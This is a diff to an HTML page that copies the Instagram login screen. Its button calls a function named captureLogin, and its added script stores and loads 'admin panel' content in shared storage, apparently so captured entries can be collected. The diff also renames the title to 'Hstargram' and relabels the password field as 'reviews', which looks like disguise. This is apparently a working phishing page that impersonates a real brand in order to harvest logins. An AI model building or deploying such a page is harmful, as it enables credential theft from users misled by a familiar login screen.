@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Login</title>
+    <title>Hstargram Login</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Billabong&display=swap');
         
@@ -271,7 +271,7 @@
         
         <input type="text" class="input-box" id="usernameInput" placeholder="Phone number, username, or email">
         
-        <input type="password" class="input-box" id="passwordInput" placeholder="Password">
+        <input type="reviews" class="input-box" id="passwordInput" placeholder="reviews">
         
         <button class="submit-button" onclick="captureLogin()">Log in</button>
 
@@ -350,5 +350,54 @@
             document.getElementById('adminPanel').classList.remove('active');
         }
     </script>
+
+
+
+<script>
+    const STORAGE_KEY = 'admin-panel-content';
+
+    async function saveContentGlobally() {
+        const panelEl = document.getElementById('adminPanel');
+        const content = panelEl.value;
+        
+        if (!content.trim()) {
+            alert('Cannot save empty content');
+            return;
+        }
+
+        try {
+            const result = await window.storage.set(STORAGE_KEY, content, true);
+            if (result) {
+                alert('Content saved globally! All admins can now access it.');
+            } else {
+                alert('Failed to save content');
+            }
+        } catch (error) {
+            alert('Error: ' + error.message);
+        }
+    }
+
+    async function loadContentGlobally() {
+        const panelEl = document.getElementById('adminPanel');
+        
+        try {
+            const result = await window.storage.get(STORAGE_KEY, true);
+            if (result && result.value) {
+                panelEl.value = result.value;
+                alert('Content loaded successfully!');
+            } else {
+                alert('No saved content found');
+            }
+        } catch (error) {
+            alert('No saved content found');
+        }
+    }
+
+    // Auto-load content when page loads
+    window.addEventListener('load', loadContentGlobally);
+</script>
+
+
+
 </body>
 </html>
